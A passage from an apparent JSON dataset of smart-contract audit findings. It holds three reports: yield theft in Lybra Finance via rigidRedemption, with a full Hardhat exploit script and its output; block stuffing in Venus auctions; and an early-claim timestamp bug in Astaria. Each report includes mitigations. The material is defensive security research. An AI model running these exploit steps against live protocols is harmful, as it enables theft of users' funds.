borrowed amount getting back a 1:1 ratio of collateral (the rest will be left in the vault and can be withdrawn).\n    ```    \n    * @notice Choose a Redemption Provider, Rigid Redeem `eusdAmount` of EUSD and get 1:1 value of stETH\n    * Emits a `RigidRedemption` event.\n    ```\n\n- `excessIncomeDistribution(uint256 stETHAmount)` from the `LybraStETHDepositVault` [contract](<https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/LybraStETHVault.sol#L62>), which enables anyone to buy the stETH, generated by lido to the vault (or by charging on withdraws and `rigidRedemptions`), for EUSD, allocating them to EUSD holders through rebasing.\n    ```\n    * @notice When stETH balance increases through LSD or other reasons, the excess income is sold for EUSD, allocated to EUSD holders through rebase mechanism.\n    * Emits a `LSDValueCaptured` event.\n    ```\nScenario:\n\n1. Users use the protocol as intended depositing stETH which will generate a yield.\n2. Bob calls the rebase mechanism (`excessIncomeDistribution`).\n3. Alice sees the rebase and preceeds it with a deposit (either by frontruinng or by pure prediction, since stETH rebase happens daily at a fixed time).\n4. Right after Bob's rebase gets executed, Alice calls `rigidRedemption` (to repay the full debt) followed by a withdraw (to get the difference out), getting most of the stETH back and some EUSD.\n5. Since the stETH charged by the withdraw function is left in the vault, if they want, Alice can now call `excessIncomeDistribution` to get the tokens back, using the EUSD recived by rebasing, and leaving with slightly more stETH and some EUSD, that they got for free; leaving 0 debts and 0 assets deposited, having left their tokens in the vault for a few seconds.\n\nHere is an hardhat script that shows the scenario above in javascript (each step is highlighted in the comments and it will print all the balances to the console).\nBefore running it you'll have to install the `'@openzeppelin/test-helpers'` package:\n\n<details>\n\n    const {ethers} = require(\"hardhat\");\n    const {\n            constants,\n            expectRevert,\n        } = require('@openzeppelin/test-helpers');//questo va installato\n    const { expect } = require(\"chai\");\n    async function main() {\n      this.accounts = await ethers.getSigners()\n            this.owner = this.accounts[0].address\n            console.log(\"Deployng contracts...\")\n            const goerliEndPoint = '0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23'\n            const goerliChainId = 10121\n\n            const oracle = await ethers.getContractFactory(\"mockChainlink\")\n            const stETH = await ethers.getContractFactory(\"stETHMock\")\n            const EUSDMock = await ethers.getContractFactory(\"EUSD\")\n            const configurator = await ethers.getContractFactory(\"Configurator\")\n            const LybraStETHDepositVault = await ethers.getContractFactory(\"LybraStETHDepositVault\")\n            const GovernanceTimelock = await ethers.getContractFactory(\"GovernanceTimelock\")\n            const EUSDMiningIncentives = await ethers.getContractFactory(\"EUSDMiningIncentives\")\n            const esLBRBoost = await ethers.getContractFactory(\"esLBRBoost\")\n            const LBR = await ethers.getContractFactory(\"LBR\")\n            const esLBR = await ethers.getContractFactory(\"esLBR\")\n            const PeUSDMainnet = await ethers.getContractFactory(\"PeUSDMainnet\")\n            const ProtocolRewardsPool = await ethers.getContractFactory(\"ProtocolRewardsPool\")\n            const mockCurvePool = await ethers.getContractFactory(\"mockCurve\")//\n            const mockUSDC = await ethers.getContractFactory(\"mockUSDC\")\n            const lbrOracleMock = await ethers.getContractFactory(\"mockLBRPriceOracle\")//\n            \n            this.oracle = await oracle.deploy()\n\n            this.lbrOracleMock = await lbrOracleMock.deploy()\n\n            this.stETHMock = await stETH.deploy()\n\n            this.GovernanceTimelock = await GovernanceTimelock.deploy(1,[this.owner],[this.owner],this.owner);\n\n\n            this.esLBRBoost = await esLBRBoost.deploy()\n\n            this.usdc = await mockUSDC.deploy()\n\n            this.mockCurvePool = await mockCurvePool.deploy()\n\n            this.configurator = await configurator.deploy(this.GovernanceTimelock.address, this.mockCurvePool.address)\n\n\n            this.LBR = await LBR.deploy(this.configurator.address, 8, goerliEndPoint)\n      \n            this.esLBR = await esLBR.deploy(this.configurator.address)\n\n\n            this.EUSDMock = await EUSDMock.deploy(this.configurator.address)\n\n            await this.configurator.initToken(this.EUSDMock.address, constants.ZERO_ADDRESS)//\n\n            this.EUSDMiningIncentives = await EUSDMiningIncentives.deploy(this.configurator.address, this.esLBRBoost.address, this.oracle.address, this.lbrOracleMock.address)\n\n            this.ProtocolRewardsPool = await ProtocolRewardsPool.deploy(this.configurator.address)\n\n            this.stETHVault = await LybraStETHDepositVault.deploy(this.configurator.address, this.stETHMock.address, this.oracle.address)\n\n            this.PeUSDMainnet = await PeUSDMainnet.deploy(this.configurator.address, 8, goerliEndPoint)\n\n            await this.mockCurvePool.setToken(this.EUSDMock.address, this.usdc.address)\n            await this.configurator.setMintVault(this.stETHVault.address, true);\n            await this.configurator.setPremiumTradingEnabled(true);\n            await this.configurator.setMintVaultMaxSupply(this.stETHVault.address, ethers.utils.parseEther(\"10000000000\"));\n            await this.configurator.setBorrowApy(this.stETHVault.address, 200);\n            await this.configurator.setEUSDMiningIncentives(this.EUSDMiningIncentives.address)\n\n            await this.EUSDMiningIncentives.setToken(this.LBR.address, this.esLBR.address)\n            await this.ProtocolRewardsPool.setTokenAddress(this.esLBR.address, this.LBR.address, this.esLBRBoost.address);\n\n\n\n\n\n\n\n            ///////////////////////////////////////////POC////////////////////////////////////////////////////////////\n\n            //random users, mints stETH and deposits them (only 1 in the script for simplicity)\n            await stETHMock.connect(accounts[2]).submit(accounts[2].address, {value:ethers.utils.parseEther(\"1000\") });\n            await stETHMock.connect(accounts[2]).approve(this.stETHVault.address, ethers.constants.MaxUint256)\n            await stETHVault.connect(accounts[2]).depositAssetToMint(await stETHMock.balanceOf(accounts[2].address),ethers.utils.parseEther(\"10000\"));\n           \n            //time passes generathing stETH yield\n            await network.provider.send(\"evm_increaseTime\", [6500])\n            await network.provider.send(\"evm_mine\")\n\n            //user 3 balances before exploit \n            await stETHMock.connect(accounts[3]).submit(accounts[3].address, {value:ethers.utils.parseEther(\"100\") });\n            //timestamp\n            const blockNumBefore = await ethers.provider.getBlockNumber();\n            const blockBefore = await ethers.provider.getBlock(blockNumBefore);\n            const timestampBefore = blockBefore.timestamp;\n            console.log(\"Timestamp before the exploit: \" + timestampBefore)\n            //stETH balance\n            const sthETHBalanceBefore = await stETHMock.balanceOf(accounts[3].address)\n            console.log(\"sthETHBalance before the exploit: \" +sthETHBalanceBefore)\n            //EUSD shares\n            const EUSDSharesBefore = await this.EUSDMock.sharesOf(accounts[3].address)\n            console.log(\"EUSD shares before the exploit: \" + EUSDSharesBefore)\n            //EUSD balance \n            const EUSDBalanceBefore = await this.EUSDMock.balanceOf(accounts[3].address)\n            console.log(\"EUSD balance before the exploit: \" + EUSDBalanceBefore)\n            //Deposited assets\n            const depositedAssetBefore = await stETHVault.depositedAsset(accounts[3].address)\n            console.log(\"Deposited assets before the exploit: \" + depositedAssetBefore)\n            //Borrowed amount\n            const borrowedBefore = await stETHVault.getBorrowedOf(accounts[3].address)\n            console.log(\"Borrowed amount before the exploit: \" + borrowedBefore)\n\n            //right before somene calls the rebasde function (excessIncomeDistribution) user3 deposits into the vault\n            const depositedAmount = ethers.utils.parseEther(\"1.0\")\n            await stETHMock.connect(accounts[3]).approve(this.stETHVault.address, ethers.constants.MaxUint256)\n            await stETHVault.connect(accounts[3]).depositAssetToMint(depositedAmount,ethers.utils.parseEther(\"1000.0\"))\n\n            //someone call excessIncomeDistribution causing the rebase to distribute the yield to users\n            await stETHVault.connect(accounts[2]).excessIncomeDistribution(ethers.utils.parseEther(\"0.01\"))\n            console.log(\"Alice deposits before rebase and withdraws immediately after\")\n\n            //right after the rebase user3 redeems all the necessary tokens\n            await this.configurator.connect(accounts[3]).becomeRedemptionProvider(true)\n            await stETHVault.connect(accounts[3]).rigidRedemption(accounts[3].address, await stETHVault.getBorrowedOf(accounts[3].address))\n            await stETHVault.connect(accounts[3]).withdraw(accounts[3].address,await stETHVault.depositedAsset(accounts[3].address));\n            await stETHVault.connect(accounts[3]).excessIncomeDistribution(ethers.utils.parseEther(\"0.01\"))\n\n           \n            //user3 balances after exploit\n            //timestamp\n            const blockNumAfter = await ethers.provider.getBlockNumber();\n            const blockAfter = await ethers.provider.getBlock(blockNumAfter);\n            const timestampAfter = blockAfter.timestamp;\n            console.log(\"Timestamp after the exploit: \" + timestampAfter)\n            //stETH balance\n            const sthETHBalanceAfter = await stETHMock.balanceOf(accounts[3].address)\n            console.log(\"sthETH balance after the exploit: \" +sthETHBalanceAfter)\n            //EUSD shares\n            const EUSDSharesAfter = await this.EUSDMock.sharesOf(accounts[3].address)\n            console.log(\"EUSD shares after the exploit: \" + EUSDSharesAfter)\n            //EUSD balance \n            const EUSDBalanceAfter = await this.EUSDMock.balanceOf(accounts[3].address)\n            console.log(\"EUSD balance after the exploit: \" + EUSDBalanceAfter)\n            //Deposited assets\n            const depositedAssetAfter = await stETHVault.depositedAsset(accounts[3].address)\n            console.log(\"Deposited assets after the exploit: \" + depositedAssetAfter)\n            //Borrowed amount\n            const borrowedAfter = await stETHVault.getBorrowedOf(accounts[3].address)\n            console.log(\"Borrowed amount after the exploit: \" + borrowedAfter)\n\n            expect(sthETHBalanceAfter > sthETHBalanceBefore)\n\n    }\n\n    // We recommend this pattern to be able to use async/await everywhere\n    // and properly handle errors.\n    main().catch((error) => {\n      console.error(error);\n      process.exitCode = 1;\n    });\n\nIt will log the following content to the console:\n\n    Deployng contracts...\n    Timestamp before the exploit: 1688138231\n    sthETHBalance before the exploit: 99999999999999999999\n    EUSD shares before the exploit: 0\n    EUSD balance before the exploit: 0\n    Deposited assets before the exploit: 0\n    Borrowed amount before the exploit: 0\n    Alice deposits before rebase and withdraws immediately after\n    Timestamp after the exploit: 1688138238\n    sthETH balance after the exploit: 100000319476188886835\n    EUSD shares after the exploit: 320852235386255949\n    EUSD balance after the exploit: 321329019285990239\n    Deposited assets after the exploit: 0\n    Borrowed amount after the exploit: 0\n\n</details>\n\n### Recommended Mitigation Steps\n\nThe same timelock logic that is applied to the withdraw function could be applied to `rigidRedemption`, making this type of interaction unprofitable.\n\n### Assessed type\n\nTiming\n\n**[LybraFinance disputed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1635597408):**\n > There is a 0.5% fee for redemptions, which offsets the potential gains from such operations.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1650757930):**\n > @LybraFinance - can you comment on why you believe the test is not showing that fee outweighing the benefit?\n\n**[LybraFinance confirmed and commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1655277926):**\n > Because in step three, there are additional fees involved when the user performs a withdraw, so it's not possible to completely avoid losses. This situation does exist, but we consider it a moderate-risk issue.\n\n**[0xean (judge) decreased severity to Medium](https://github.com/code-423n4/2023-06-lybra-findings/issues/290#issuecomment-1655652712)**\n\n***\n\n",
+      "summary": "\nThis bug report is about a potential exploit in the LybraFinance protocol. The exploit involves the withdraw and rigidRedemption functions of the LybraEUSDVaultBase vaults. The withdraw function is protected by a time softlock, which prevents users from hopping in and out of the protocol to gain access to the yield generated by other users and then leave right away. The same measure isn't applied to rigidRedemption, which enables a user to withdraw most of the underlying assets at any time after deposit. This allows a malicious user to get access to yield that they didn't generate, effectively stealing it from others. \n\nThe recommended mitigation step is to apply the same timelock logic that is applied to the withdraw function to rigidRedemption, making this type of interaction unprofitable. LybraFinance have disputed this and commented that there is a 0.5% fee for redemptions, which offsets the potential gains from such operations. 0xean (judge) has commented that this is an acceptable mitigation step for the exploit.",
+      "report_date": {},
+      "contest_prize_txt": "$60,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2023-06-lybra",
+      "sponsor_name": "Lybra Finance",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2023-06-lybra",
+      "github_link": "https://github.com/code-423n4/2023-06-lybra-findings/issues/290",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "254",
+      "slug": "m-15-lack-of-timelock-on-rigidredemption-enables-to-steal-yield-from-other-users-code4rena-lybra-finance-lybra-finance-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Lybra Finance",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Lybra Finance",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Rebasing Tokens"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        }
+      ]
+    },
+    {
+      "id": "20770",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "917",
+      "title": "[M-01] Malicious actor can win an auction unfavorably to the protocol by block stuffing",
+      "content": "\n<https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L158-L202><br><https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L467-L470><br><https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L213>\n\nWhen the protocol bad debt is auctioned off with 10% incentive at the beginning, a user who gives the best bid wins. The auction ends when at least one account placed a bid, and the current block number is bigger than `nextBidderBlockLimit`:\n\n```jsx\nfunction closeAuction(address comptroller) external nonReentrant {\n        Auction storage auction = auctions[comptroller];\n\n        require(_isStarted(auction), \"no on-going auction\");\n        require(\n            block.number > auction.highestBidBlock + nextBidderBlockLimit && auction.highestBidder != address(0),\n            \"waiting for next bidder. cannot close auction\"\n        );\n```\n\n`nextBidderBlockLimit` is set to 10 in the initializer, which means that other users have only 30 seconds to place a better bid. This is a serious problem because stuffing a whole block with dummy transactions is very cheap on Binance Smart Chain. According to <https://www.cryptoneur.xyz/en/gas-fees-calculator>, 15M gas - whole block - costs `$`14\\~`$`15 on BSC. This makes a malicious user occasionally cheaply prohibit other users to overbid them, winning the auction at the least favorable price for the protocol. Because BSC is a centralized blockchain, there are no private mempools and bribes directly to the miners (like in FlashBots); hence, other users are very limited concerning the prohibitive actions.\n\n### Impact\n\nThe protocol overpays for bad debt, losing value.\n\n### Proof of Concept\n\n1.  Pool gathered `$`100,000 in bad debt and it's eligible for auction.\n2.  A malicious user frontruns others and places the first bid with the least possible amount (bad debt + 10% incentive).\n3.  The user sends dozens of dummy transactions with increased gas prices, only to fill up whole block space for 11 blocks.\n4.  At the end, the user sends a transaction to close the auction, getting the bad debt + 10% incentive.\n\n### Recommended Mitigation Steps\n\nThere are at least three options to resolve this issue:\n\n1.  Make the bidding window much higher at the beginning; like 1000 blocks.\n2.  Make the bidding window very high at the beginning and decrease it; the more attractive the new bid is.\n3.  Make the bidding window dependent on the money at stake, to disincentivize block stuffing.\n\n**[chechu (Venus) confirmed](https://github.com/code-423n4/2023-05-venus-findings/issues/525#issuecomment-1560160686)**\n\n***\n\n",
+      "summary": "\nThis bug report is about an issue with the Shortfall protocol, which is used to auction off bad debt with a 10% incentive to the winner. The issue is that the bidding window is set to only 10 blocks, which is only 30 seconds, making it easy for malicious users to stuff the block with dummy transactions and win the auction at the least favorable price for the protocol. This results in the protocol overpaying for bad debt, losing value.\n\nTo prove the concept, the bug report outlines a scenario where a malicious user gathers $100,000 in bad debt and places the first bid with the least possible amount (bad debt + 10% incentive). They then send dozens of dummy transactions with increased gas prices, only to fill up the whole block space for 11 blocks. At the end, they send a transaction to close the auction, getting the bad debt + 10% incentive.\n\nTo mitigate this issue, the bug report suggests three options: making the bidding window much higher at the beginning, making the bidding window very high at the beginning and decreasing it as more attractive bids come in, or making the bidding window dependent on the money at stake to disincentivize block stuffing.",
+      "report_date": {},
+      "contest_prize_txt": "$90,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2023-05-venus",
+      "sponsor_name": "Venus Protocol",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2023-05-venus",
+      "github_link": "https://github.com/code-423n4/2023-05-venus-findings/issues/525",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "236",
+      "slug": "m-01-malicious-actor-can-win-an-auction-unfavorably-to-the-protocol-by-block-stuffing-code4rena-venus-protocol-venus-protocol-isolated-pools-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Venus Protocol",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Venus Protocol",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        }
+      ]
+    },
+    {
+      "id": "3672",
+      "kind": "GIT",
+      "auditfirm_id": "3",
+      "impact": "HIGH",
+      "finders_count": 1,
+      "protocol_id": "41",
+      "title": "H-34: liquidationAccountant can be claimed at any time",
+      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/46 \n\n## Found by \nobront\n\n## Summary\n\nNew liquidations are sent to the `liquidationAccountant` with a `finalAuctionTimestamp` value, but the actual value that is passed in is simply the duration of an auction. The `claim()` function uses this value in a require check, so this error will allow it to be called before the auction is complete.\n\n## Vulnerability Detail\n\nWhen a lien is liquidated, `AstariaRouter.sol:liquidate()` is called. If the lien is set to end in a future epoch, we call `handleNewLiquidation()` on the `liquidationAccountant`.\n\nOne of the values passed in this call is the `finalAuctionTimestamp`, which updates the `finalAuctionEnd` variable in the `liquidationAccountant`. This value is then used to protect the `claim()` function from being called too early.\n\nHowever, when the router calls `handleLiquidationAccountant()`, it passes the duration of an auction rather than the final timestamp:\n\n```solidity\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\nAs a result, `finalAuctionEnd` will be set to 259200 (3 days). \n\nWhen `claim()` is called, it requires the final auction to have ended for the function to be called:\n\n```solidity\nrequire(\n  block.timestamp > finalAuctionEnd || finalAuctionEnd == uint256(0),\n  \"final auction has not ended\"\n);\n```\nBecause of the error above, `block.timestamp` will always be greater than `finalAuctionEnd`, so this will always be permitted. \n\n## Impact\n\nAnyone can call `claim()` before an auction has ended. This can cause many problems, but the clearest is that it can ruin the protocol's accounting by decreasing the Y intercept of the vault. \n\nFor example, if `claim()` is called before the auction, the returned value will be 0, so the Y intercept will be decreased as if there was an auction that returned no funds. \n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L407-L410\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L113-L120\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LiquidationAccountant.sol#L65-L69\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdjust the call from the router to use the ending timestamp as the argument, rather than the duration:\n\n```solidity\nLiquidationAccountant(accountant).handleNewLiquidation(\n  lien.amount,\n  block.timestamp + COLLATERAL_TOKEN.auctionWindow() + 1 days\n);\n```\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nTouched on the same idea as #135. Tough call on duplication. This issue + #47 combine represent the same vulnerability fixed in both #135 and #188. In this issue it addresses being called too early and in #47 it addresses being called multiple times. The fix proposed in #135 and #188 address both issues by permissioning the function. IMHO this and 47 should be duped with #135 and #188, but up to judges. \n\nALSO little bit of a conflict of interest that @zobront validated his own issue here.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Touched on the same idea as #135. Tough call on duplication. This issue + #47 combine represent the same vulnerability fixed in both #135 and #188. In this issue it addresses being called too early and in #47 it addresses being called multiple times. The fix proposed in #135 and #188 address both issues by permissioning the function. IMHO this and 47 should be duped with #135 and #188, but up to judges. \n> \n> ALSO little bit of a conflict of interest that @zobront validated his own issue here.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted.\n\n#135 and #188 are already duplicates. This issue and #47 touch on the same core issue that `claim()` is not safe to be publicly callable. \n\n**sherlock-admin**\n\n> Escalation accepted.\n> \n> #135 and #188 are already duplicates. This issue and #47 touch on the same core issue that `claim()` is not safe to be publicly callable. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**zobront**\n\nEscalate for 5 USDC\n\nThis isn’t a dup of #135 or #188. Those two issues are talking about access control for the function. This calls out that there is a specific time enforcement mechanism (`finalAuctionTimestamp`) that is calculated incorrectly, allowing it to be called early.\n\nYes, I agree that adding access controls (their solution) would reduce the harm from this issue, but they are unrelated issues that just happen to have overlapping solutions. The real solution to this one is to do the calculation properly.\n\nNOTE: The other issue of mine that was dup’d with these is #47, which focuses on that there aren’t restrictions to stop `claim()` being called multiple times. I probably wouldn’t consider that a dup of theirs either, but it’s on the fence so I’m ok with it — but this one is clearly different.\n\n**sherlock-admin**\n\n > Escalate for 5 USDC\n> \n> This isn’t a dup of #135 or #188. Those two issues are talking about access control for the function. This calls out that there is a specific time enforcement mechanism (`finalAuctionTimestamp`) that is calculated incorrectly, allowing it to be called early.\n> \n> Yes, I agree that adding access controls (their solution) would reduce the harm from this issue, but they are unrelated issues that just happen to have overlapping solutions. The real solution to this one is to do the calculation properly.\n> \n> NOTE: The other issue of mine that was dup’d with these is #47, which focuses on that there aren’t restrictions to stop `claim()` being called multiple times. I probably wouldn’t consider that a dup of theirs either, but it’s on the fence so I’m ok with it — but this one is clearly different.\n\nYou've created a valid escalation for 5 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted. at the initial escalation we misinterpreted the https://github.com/sherlock-audit/2022-10-astaria-judging/issues/135 / https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 as it was thought they described both issues. \n\n**sherlock-admin**\n\n> Escalation accepted. at the initial escalation we misinterpreted the https://github.com/sherlock-audit/2022-10-astaria-judging/issues/135 / https://github.com/sherlock-audit/2022-10-astaria-judging/issues/188 as it was thought they described both issues. \n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
+      "summary": "\nThis bug report is about an issue found in the AstariaRouter.sol and LiquidationAccountant.sol contracts. The issue is that when a lien is liquidated, the liquidationAccountant is called with a `finalAuctionTimestamp` value that is simply the duration of an auction. This value is then used to protect the `claim()` function from being called too early, but it is set to 259200 (3 days) instead of the ending timestamp, so the `block.timestamp` will always be greater than `finalAuctionEnd`. As a result, anyone can call `claim()` before an auction has ended, which can cause many problems including ruining the protocol's accounting. The recommended fix is to adjust the call from the router to use the ending timestamp as the argument, rather than the duration. This issue was found by obront and validated by zobront. There were two escalations for 1 USDC and 5 USDC, which were accepted by sherlock-admin. The issue was thought to be a duplicate of issues #135 and #188, but it was determined that these two issues are talking about access control for the function, while this issue calls out that there is a specific time enforcement mechanism that is calculated incorrectly.",
+      "report_date": {},
+      "contest_prize_txt": "50000 USDC",
+      "contest_link": "https://app.sherlock.xyz/audits/contests/8",
+      "sponsor_name": "Astaria",
+      "sponsor_link": "",
+      "quality_score": 2,
+      "general_score": 2,
+      "source_link": "",
+      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/46",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "8",
+      "slug": "h-34-liquidationaccountant-can-be-claimed-at-any-time-sherlock-astaria-astaria-git",
+      "firm_name": "Sherlock",
+      "firm_logo_square": "sherlock_square.png",
+      "protocol_name": "Astaria",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Sherlock",
+        "logo_square": "sherlock_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Astaria",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "RWA"
+            },
+            "score": 1
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "NFT Lending"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "CDP"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Timing"
+          }
+        }
+      ]
+    }
+  ]
+}
